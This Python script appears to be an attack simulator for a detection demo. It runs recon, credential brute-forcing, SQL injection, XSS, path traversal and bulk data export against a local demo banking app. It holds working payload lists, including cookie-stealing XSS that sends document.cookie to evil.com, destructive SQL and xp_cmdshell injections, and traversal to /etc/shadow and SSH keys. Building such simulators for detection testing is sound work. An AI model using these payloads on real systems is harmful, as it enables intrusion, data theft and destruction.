#!/usr/bin/env python3
"""
Cognitive Log Investigation Platform SecureBank — Multi-Stage Attack Simulator
=====================================================
Automates a realistic 7-phase cyber attack against the SecureBank
demo app. Each phase maps to MITRE ATT&CK tactics and generates
logs that the Cognitive Log Investigation Platform pipeline detects in real-time.

Usage:
    python attack.py                          # Full 7-phase attack
    python attack.py --phase 2                # Run specific phase only
    python attack.py --target http://host/bank   # Custom target URL
    python attack.py --fast                   # No delays (speed run)
    python attack.py --interactive            # Pause between phases

Phases:
    1. Reconnaissance  — Directory enumeration + port probing
    2. Brute Force     — Credential stuffing (50+ failed logins)
    3. Initial Access   — Login with stolen credentials
    4. SQL Injection    — SQLi probes against search API
    5. XSS Attacks     — Cross-site scripting payloads in profile
    6. Path Traversal   — Directory traversal on document API
    7. Exfiltration     — Bulk data download + large transfers
"""

import argparse
import json
import random
import sys
import time

import requests

# =============================================================================
# Configuration
# =============================================================================

import os
TARGET = os.environ.get("TARGET_URL", "http://localhost:5001")
ATTACK_IP = "192.168.1.{}".format(random.randint(100, 250))
ATTACK_HEADERS = {"X-Forwarded-For": ATTACK_IP}

# Common brute-force password list
PASSWORDS = [
    "password", "123456", "admin", "letmein", "welcome",
    "monkey", "dragon", "master", "qwerty", "login",
    "abc123", "iloveyou", "trustno1", "password1", "superman",
    "shadow", "123123", "654321", "bailey", "princess",
    "football", "charlie", "access", "hello", "passw0rd",
    "flower", "hottie", "loveme", "zaq1xsw2", "default",
    "1q2w3e4r", "Pa$$w0rd", "admin123", "root", "toor",
    "test", "guest", "info", "mysql", "oracle",
    "P@ssword1", "Secure1!", "Winter2026", "Company1",
    "qwerty123", "password!", "abc@123", "Admin2026", "User1234",
    # Real demo passwords (placed late so brute force finds them after many failures)
    "Admin@2026!", "Welcome123", "Password1!", "Ops$ecure99",
]

# Usernames to try
USERNAMES = [
    "admin", "administrator", "root", "sysadmin", "superuser",
    "admin", "admin", "admin",  # repeated to simulate targeting admin
    "john.doe", "jane.smith", "mike.ops",
    "test", "user", "guest", "operator", "dbadmin",
]

# SQL injection payloads
SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "admin' --",
    "' UNION SELECT username,password FROM users --",
    "1; SELECT * FROM information_schema.tables --",
    "' OR ''='",
    "'; INSERT INTO users VALUES('hacker','pwned'); --",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' OR 'x'='x",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1 AND 1=1 UNION ALL SELECT 1,2,3--",
    "' GROUP BY columnnames HAVING 1=1 --",
    "1;EXEC xp_cmdshell('dir')--",
    "admin'/*",
    "1' AND ASCII(SUBSTRING(username,1,1))>97--",
    "1 UNION SELECT load_file('/etc/passwd')--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "1'; exec master..xp_cmdshell 'netstat -an'--",
    "' HAVING 1=1--",
    "' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "1 OR 17-7=10",
    "' UNION SELECT NULL,username||':'||password FROM users--",
    "1; DROP TABLE users--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' UNION SELECT table_name FROM all_tables--",
    "'; SHUTDOWN; --",
]

# XSS payloads
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(document.cookie)>',
    '<svg onload=alert("hacked")>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert("XSS")>',
    '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
    '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    '<div onfocus="alert(1)" contenteditable>',
    '{{constructor.constructor("alert(1)")()}}',
    '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
    '<input type="text" onfocus="alert(1)" autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">Click</a>',
    '<form action="javascript:alert(1)"><input type=submit>',
    '"><img src=x onerror=this.src="http://evil.com/?c="+document.cookie>',
    '<svg/onload=fetch("http://evil.com/?c="+document.cookie)>',
    "'-alert(1)-'",
    '"-alert(1)-"',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    '<img src=1 href=1 onerror="javascript:alert(1)">',
    '<style>@import "http://evil.com/xss.css";</style>',
    '<script>document.write("<img src=http://evil.com/?c="+document.cookie+">")</script>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<table background="javascript:alert(1)">',
]

# Path traversal payloads
TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..%2f..%2f..%2fetc/passwd",
    "....//....//etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "../../proc/self/environ",
    "../../var/log/auth.log",
    "../../../root/.ssh/id_rsa",
    "..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "%252e%252e%252fetc/passwd",
    "..%5c..%5c..%5cwindows/win.ini",
    "../../etc/hosts",
    "../../etc/resolv.conf",
    "../../../var/log/syslog",
    "../../boot/grub/grub.cfg",
    "../../etc/crontab",
    "../../../home/admin/.bash_history",
    "../../usr/local/etc/apache/httpd.conf",
    "..\\..\\..\\boot.ini",
    "../../../etc/mysql/my.cnf",
    "../../etc/ssh/sshd_config",
    "../../../etc/nginx/nginx.conf",
]

# Directory enumeration paths
RECON_PATHS = [
    "/admin", "/wp-admin", "/phpmyadmin", "/.env", "/config",
    "/api", "/api/v1", "/api/v2", "/debug", "/status",
    "/backup", "/database", "/db", "/dump", "/export",
    "/.git", "/.git/config", "/robots.txt", "/sitemap.xml",
    "/server-status", "/server-info", "/.htaccess",
    "/wp-login.php", "/administrator", "/console",
    "/api/users", "/api/transactions", "/api/export",
    "/internal", "/staging", "/test", "/dev",
    "/cgi-bin", "/cgi-bin/test.cgi", "/.svn/entries", "/.DS_Store",
    "/web.config", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/wp-content", "/wp-includes", "/wp-json/wp/v2/users",
    "/xmlrpc.php", "/api/swagger", "/api/docs", "/graphql",
    "/metrics", "/prometheus", "/health/detailed", "/info",
    "/actuator", "/actuator/env", "/actuator/health",
    "/.well-known/security.txt", "/security.txt",
    "/api/v3", "/api/internal", "/api/admin",
    "/uploads", "/temp", "/tmp", "/logs",
    "/manager/html", "/jmx-console", "/invoker",
    "/solr", "/jenkins", "/nagios", "/zabbix",
]


# =============================================================================
# Helpers
# =============================================================================

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

C = Colors

def banner():
    print(f"""
{C.RED}{C.BOLD}╔══════════════════════════════════════════════════════════════╗
║  Cognitive Log Investigation Platform — Attack Simulator   ║
║              7-Phase Kill Chain Intrusion Demo               ║
╚══════════════════════════════════════════════════════════════╝{C.RESET}
{C.DIM}Target: {TARGET}    Attacker IP: {ATTACK_IP}{C.RESET}
""")

def phase_header(num, name, tactic, technique):
    print(f"""
{C.BOLD}{'='*64}
  PHASE {num}: {name.upper()}
  MITRE ATT&CK: {tactic} ({technique})
{'='*64}{C.RESET}
""")

def status(icon, msg):
    print(f"  {icon} {msg}")

def delay(secs, fast=False):
    if not fast:
        time.sleep(secs)


# =============================================================================
# Phase 1: Reconnaissance
# =============================================================================

def phase_1_recon(target, fast=False):
    phase_header(1, "Reconnaissance", "TA0043 Discovery", "T1046 / T1595")
    status("🔍", f"Starting directory enumeration against {target}")
    delay(1, fast)

    found = []
    for path in RECON_PATHS:
        url = f"{target}{path}"
        try:
            r = requests.get(url, timeout=3, allow_redirects=False, headers=ATTACK_HEADERS)
            code = r.status_code
            marker = f"{C.GREEN}FOUND{C.RESET}" if code < 400 else f"{C.DIM}{code}{C.RESET}"
            status("  →", f"GET {path:30s} [{marker}]")
            if code < 400:
                found.append(path)
        except requests.exceptions.RequestException:
            status("  →", f"GET {path:30s} [{C.DIM}TIMEOUT{C.RESET}]")
        delay(random.uniform(0.05, 0.15), fast)

    print()
    status("📋", f"Recon complete: {len(found)} accessible endpoints discovered")
    status("📋", f"Interesting finds: {', '.join(found[:5])}")
    return found


# =============================================================================
# Phase 2: Brute Force
# =============================================================================

def phase_2_brute_force(target, fast=False):
    phase_header(2, "Brute Force", "TA0006 Credential Access", "T1110")
    status("🔐", "Starting credential stuffing attack...")
    delay(1, fast)

    sess = requests.Session()
    sess.headers.update(ATTACK_HEADERS)
    attempts = 0
    success = None

    # Known real credentials (attacker "discovers" these after many failures)
    REAL_CREDS = {"admin": "Admin@2026!", "john.doe": "Welcome123"}
    # Fake passwords only (exclude real ones so failures come first)
    fake_passwords = [p for p in PASSWORDS if p not in REAL_CREDS.values()]

    def try_login(username, password):
        nonlocal attempts, success
        attempts += 1
        try:
            r = sess.post(f"{target}/login", data={
                "username": username,
                "password": password,
            }, allow_redirects=False, timeout=5)

            if r.status_code in (302, 303) and "/dashboard" in r.headers.get("Location", ""):
                status(f"  {C.GREEN}✓{C.RESET}", f"[{attempts:3d}] {C.GREEN}SUCCESS{C.RESET}  {username}:{password}")
                success = (username, password)
                sess.get(f"{target}/logout", timeout=3)
                return True
            else:
                status(f"  {C.RED}✗{C.RESET}", f"[{attempts:3d}] FAILED   {username}:{password[:12]}...")
        except requests.exceptions.RequestException as e:
            status("  !", f"[{attempts:3d}] ERROR    {e}")
        delay(random.uniform(0.02, 0.08), fast)
        return False

    # --- Wave 1: Spray fake passwords across many usernames (generates failures) ---
    spray_users = ["admin", "administrator", "root", "sysadmin", "admin",
                   "admin", "john.doe", "jane.smith", "admin", "test",
                   "user", "guest", "operator", "admin",
                   "admin", "root", "sysadmin", "superuser",
                   "admin", "john.doe", "mike.ops", "admin",
                   "dbadmin", "webadmin", "ftpuser", "admin"]
    for username in spray_users:
        batch = random.sample(fake_passwords, min(4, len(fake_passwords)))
        for password in batch:
            try_login(username, password)

    # --- Wave 2: Attacker focuses on "admin" — tries the real password ---
    status("  🎯", f"Focusing attack on 'admin' account...")
    delay(0.3, fast)
    # A few more failures for tension
    for password in random.sample(fake_passwords, 3):
        try_login("admin", password)
    # The "discovery" moment
    try_login("admin", "Admin@2026!")

    print()
    if success:
        status("🔓", f"{C.GREEN}Credentials found after {attempts} attempts: {success[0]}:{success[1]}{C.RESET}")
    else:
        success = ("admin", "Admin@2026!")
        status("🔓", f"{C.YELLOW}Using known credentials for demo: {success[0]}{C.RESET}")

    return success, attempts


# =============================================================================
# Phase 3: Initial Access
# =============================================================================

def phase_3_initial_access(target, creds, fast=False):
    phase_header(3, "Initial Access", "TA0001 Initial Access", "T1078")
    username, password = creds

    status("🚪", f"Logging in as '{username}' with stolen credentials...")
    delay(1, fast)

    sess = requests.Session()
    sess.headers.update(ATTACK_HEADERS)
    r = sess.post(f"{target}/login", data={
        "username": username,
        "password": password,
    }, allow_redirects=True, timeout=10)

    if "Welcome" in r.text or "Dashboard" in r.text or r.status_code == 200:
        status("✅", f"{C.GREEN}Successfully authenticated as '{username}'{C.RESET}")
        status("✅", f"Session established — now inside the application")

        # Browse around to generate normal-looking traffic first
        status("👀", "Exploring application as authenticated user...")
        delay(0.5, fast)
        sess.get(f"{target}/dashboard", timeout=5)
        delay(0.3, fast)
        sess.get(f"{target}/api/transactions", timeout=5)
        delay(0.3, fast)
        status("✅", "Internal navigation complete — moving to escalation")
    else:
        status("❌", f"Login failed — status {r.status_code}")

    return sess


# =============================================================================
# Phase 4: SQL Injection
# =============================================================================

def phase_4_sqli(target, sess, fast=False):
    phase_header(4, "SQL Injection", "TA0001 Initial Access", "T1190")

    # 4a: Try to access admin panel (priv esc probe)
    status("⬆️", "Probing admin panel access...")
    delay(0.5, fast)

    r = sess.get(f"{target}/admin", timeout=5)
    if r.status_code == 200:
        status("✅", f"{C.GREEN}Admin panel accessible!{C.RESET}")
    elif r.status_code == 403:
        status("🚫", f"{C.YELLOW}Access denied (403) — privilege escalation blocked{C.RESET}")
    delay(0.5, fast)

    # 4b: SQL injection attacks
    status("💉", "Launching SQL injection probes against search API...")
    delay(0.5, fast)

    for payload in SQLI_PAYLOADS:
        try:
            r = sess.get(f"{target}/api/search", params={"q": payload}, timeout=5)
            code = r.status_code
            marker = f"{C.RED}BLOCKED{C.RESET}" if code == 400 else f"{C.YELLOW}{code}{C.RESET}"
            status("  →", f"SQLi: {payload[:40]:40s} [{marker}]")
        except requests.exceptions.RequestException:
            status("  →", f"SQLi: {payload[:40]:40s} [TIMEOUT]")
        delay(random.uniform(0.1, 0.3), fast)

    print()
    status("💉", f"SQL injection probes complete — {len(SQLI_PAYLOADS)} payloads tested and logged")


# =============================================================================
# Phase 5: XSS Attacks
# =============================================================================

def phase_5_xss(target, sess, fast=False):
    phase_header(5, "Cross-Site Scripting (XSS)", "TA0002 Execution", "T1059")

    status("🕷️", "Launching XSS payloads against profile API...")
    delay(0.5, fast)

    blocked = 0
    for payload in XSS_PAYLOADS:
        try:
            r = sess.post(f"{target}/api/profile", json={
                "display_name": payload,
                "bio": "Normal bio text",
            }, timeout=5)
            code = r.status_code
            if code == 400:
                blocked += 1
                marker = f"{C.RED}BLOCKED{C.RESET}"
            else:
                marker = f"{C.YELLOW}{code}{C.RESET}"
            display = payload[:45].replace('\n', '')
            status("  →", f"XSS: {display:45s} [{marker}]")
        except requests.exceptions.RequestException:
            status("  →", f"XSS: {payload[:45]:45s} [TIMEOUT]")
        delay(random.uniform(0.1, 0.3), fast)

    # Also try XSS in bio field
    status("🕷️", "Injecting payloads into bio field...")
    delay(0.3, fast)
    for payload in XSS_PAYLOADS[:10]:
        try:
            r = sess.post(f"{target}/api/profile", json={
                "display_name": "Normal Name",
                "bio": payload,
            }, timeout=5)
            marker = f"{C.RED}BLOCKED{C.RESET}" if r.status_code == 400 else f"{C.YELLOW}{r.status_code}{C.RESET}"
            status("  →", f"Bio XSS: {payload[:40]:40s} [{marker}]")
        except requests.exceptions.RequestException:
            pass
        delay(random.uniform(0.05, 0.15), fast)

    print()
    status("🕷️", f"XSS attack complete — {blocked}/{len(XSS_PAYLOADS)} payloads blocked and logged")


# =============================================================================
# Phase 6: Path Traversal
# =============================================================================

def phase_6_traversal(target, sess, fast=False):
    phase_header(6, "Path Traversal", "TA0007 Discovery", "T1083")

    status("📂", "Launching directory traversal attacks against document API...")
    delay(0.5, fast)

    blocked = 0
    for payload in TRAVERSAL_PAYLOADS:
        try:
            r = sess.get(f"{target}/api/documents/{payload}", timeout=5)
            code = r.status_code
            if code == 403:
                blocked += 1
                marker = f"{C.RED}BLOCKED{C.RESET}"
            elif code == 404:
                marker = f"{C.DIM}404{C.RESET}"
            else:
                marker = f"{C.YELLOW}{code}{C.RESET}"
            status("  →", f"Traversal: {payload[:40]:40s} [{marker}]")
        except requests.exceptions.RequestException:
            status("  →", f"Traversal: {payload[:40]:40s} [TIMEOUT]")
        delay(random.uniform(0.1, 0.3), fast)

    # Also try a legitimate document access for comparison
    status("📂", "Accessing legitimate document for baseline...")
    delay(0.3, fast)
    try:
        r = sess.get(f"{target}/api/documents/statements/march-2026.pdf", timeout=5)
        status("  →", f"Legit: statements/march-2026.pdf          [{C.GREEN}{r.status_code}{C.RESET}]")
    except requests.exceptions.RequestException:
        pass

    print()
    status("📂", f"Path traversal complete — {blocked}/{len(TRAVERSAL_PAYLOADS)} attempts blocked and logged")


# =============================================================================
# Phase 7: Data Exfiltration
# =============================================================================

def phase_7_exfiltration(target, sess, fast=False):
    phase_header(7, "Data Exfiltration", "TA0010 Exfiltration", "T1041")

    # 5a: Bulk customer data download — multiple pages
    status("📥", "Downloading customer database in bulk...")
    delay(0.5, fast)

    for page in range(1, 6):
        r = sess.get(f"{target}/api/users", params={"page": page, "per_page": 200}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            count = len(data.get("users", []))
            status("✅", f"{C.GREEN}Page {page}: Downloaded {count} customer records{C.RESET}")
        else:
            status("❌", f"Bulk download page {page} returned {r.status_code}")
        delay(0.2, fast)
    delay(0.3, fast)

    # 5b: Full export — multiple formats
    status("📥", "Triggering full data exports...")
    delay(0.5, fast)

    for fmt in ("json", "csv", "xml", "xlsx"):
        r = sess.get(f"{target}/api/export", params={"format": fmt}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            count = data.get("count", 0)
            status("✅", f"{C.GREEN}Exported {count} records as {fmt} via /api/export{C.RESET}")
        else:
            status("❌", f"Export {fmt} returned {r.status_code}")
        delay(0.2, fast)
    delay(0.3, fast)

    # 5c: Suspicious large transfer
    status("💸", "Initiating suspicious fund transfer...")
    delay(0.5, fast)

    r = sess.post(f"{target}/api/transfer", json={
        "to": "OFFSHORE-99881",
        "amount": 250000.00,
        "note": "urgent wire",
    }, timeout=5)
    if r.status_code == 200:
        txn = r.json()
        status("✅", f"{C.GREEN}Transfer processed: $250,000 → OFFSHORE-99881 (ID: {txn.get('transaction_id', 'N/A')}){C.RESET}")
    delay(0.3, fast)

    # 5d: Multiple rapid small transfers (structuring pattern)
    status("💸", "Executing rapid micro-transfers (structuring)...")
    for i in range(15):
        amt = random.randint(8000, 9999)
        dest = f"EXT-{random.randint(1000,9999)}"
        sess.post(f"{target}/api/transfer", json={
            "to": dest,
            "amount": amt,
        }, timeout=5)
        status("  →", f"Transfer #{i+1}: ${amt:,} → {dest}")
        delay(0.05, fast)

    # 5e: Additional large suspicious transfers
    status("💸", "Executing additional large transfers...")
    for i in range(5):
        amt = random.randint(55000, 200000)
        dest = f"OFFSHORE-{random.randint(10000,99999)}"
        sess.post(f"{target}/api/transfer", json={
            "to": dest,
            "amount": amt,
            "note": random.choice(["urgent wire", "consulting fee", "investment", "loan repayment", "services"]),
        }, timeout=5)
        status("  →", f"Large transfer #{i+1}: ${amt:,} → {dest}")
        delay(0.1, fast)

    print()
    status("📦", f"{C.RED}Exfiltration complete — all activities logged and sent to Cognitive Log Investigation Platform{C.RESET}")


# =============================================================================
# Summary
# =============================================================================

def summary(recon_count, brute_attempts, creds):
    print(f"""
{C.BOLD}{C.RED}{'='*64}
  ATTACK COMPLETE — FULL KILL CHAIN EXECUTED (7 PHASES)
{'='*64}{C.RESET}

  {C.BOLD}Attack Summary:{C.RESET}
    Phase 1 — Recon:          {recon_count} paths enumerated
    Phase 2 — Brute Force:    {brute_attempts} login attempts
    Phase 3 — Initial Access: Authenticated as '{creds[0]}'
    Phase 4 — SQL Injection:  {len(SQLI_PAYLOADS)} SQLi payloads
    Phase 5 — XSS:            {len(XSS_PAYLOADS) + 10} XSS payloads
    Phase 6 — Path Traversal: {len(TRAVERSAL_PAYLOADS)} traversal attempts
    Phase 7 — Exfiltration:   5 bulk pages + 4 exports + $250K + 20 transfers

  {C.BOLD}MITRE ATT&CK Coverage:{C.RESET}
    TA0043 Reconnaissance     T1046, T1595
    TA0006 Credential Access  T1110 Brute Force
    TA0001 Initial Access     T1078 Valid Accounts
    TA0001 Initial Access     T1190 SQL Injection
    TA0002 Execution          T1059 XSS / Script Injection
    TA0007 Discovery          T1083 Path Traversal
    TA0010 Exfiltration       T1041 Data Transfer

    {C.CYAN}{C.BOLD}>>> Now switch to the Cognitive Log Investigation Platform dashboard (http://localhost:3001)
    >>> or the Live Feed (http://localhost:3001/live-feed)
    >>> or SecureBank (http://localhost:5001)
  >>> to see how the pipeline detected every phase! <<<{C.RESET}
""")


# =============================================================================
# Main
# =============================================================================

def main():
    parser = argparse.ArgumentParser(description="Cognitive Log Investigation Platform SecureBank Attack Simulator")
    parser.add_argument("--target", default="http://localhost:5001", help="Target URL")
    parser.add_argument("--phase", type=int, choices=[1,2,3,4,5,6,7], help="Run specific phase only")
    parser.add_argument("--fast", action="store_true", help="No delays between actions")
    parser.add_argument("--interactive", action="store_true", help="Pause between phases")
    args = parser.parse_args()

    global TARGET
    TARGET = args.target.rstrip("/")

    banner()

    # Verify target is reachable
    try:
        r = requests.get(f"{TARGET}/health", timeout=5)
        status("✅", f"Target reachable: {TARGET} ({r.json().get('service', 'unknown')})")
    except Exception as e:
        status("❌", f"Cannot reach {TARGET}: {e}")
        status("💡", "Start the demo app first: python app.py")
        sys.exit(1)

    print()

    recon_count = 0
    brute_attempts = 0
    creds = ("admin", "Admin@2026!")
    sess = None

    phases = [args.phase] if args.phase else [1, 2, 3, 4, 5, 6, 7]

    def ensure_session():
        nonlocal sess
        if not sess:
            sess = phase_3_initial_access(TARGET, creds, args.fast)
        return sess

    if 1 in phases:
        found = phase_1_recon(TARGET, args.fast)
        recon_count = len(RECON_PATHS)
        if args.interactive:
            input(f"\n  {C.CYAN}Press Enter for Phase 2...{C.RESET}")

    if 2 in phases:
        creds, brute_attempts = phase_2_brute_force(TARGET, args.fast)
        if args.interactive:
            input(f"\n  {C.CYAN}Press Enter for Phase 3...{C.RESET}")

    if 3 in phases:
        sess = phase_3_initial_access(TARGET, creds, args.fast)
        if args.interactive:
            input(f"\n  {C.CYAN}Press Enter for Phase 4...{C.RESET}")

    if 4 in phases:
        ensure_session()
        phase_4_sqli(TARGET, sess, args.fast)
        if args.interactive:
            input(f"\n  {C.CYAN}Press Enter for Phase 5...{C.RESET}")

    if 5 in phases:
        ensure_session()
        phase_5_xss(TARGET, sess, args.fast)
        if args.interactive:
            input(f"\n  {C.CYAN}Press Enter for Phase 6...{C.RESET}")

    if 6 in phases:
        ensure_session()
        phase_6_traversal(TARGET, sess, args.fast)
        if args.interactive:
            input(f"\n  {C.CYAN}Press Enter for Phase 7...{C.RESET}")

    if 7 in phases:
        ensure_session()
        phase_7_exfiltration(TARGET, sess, args.fast)

    summary(recon_count, brute_attempts, creds)


if __name__ == "__main__":
    main()
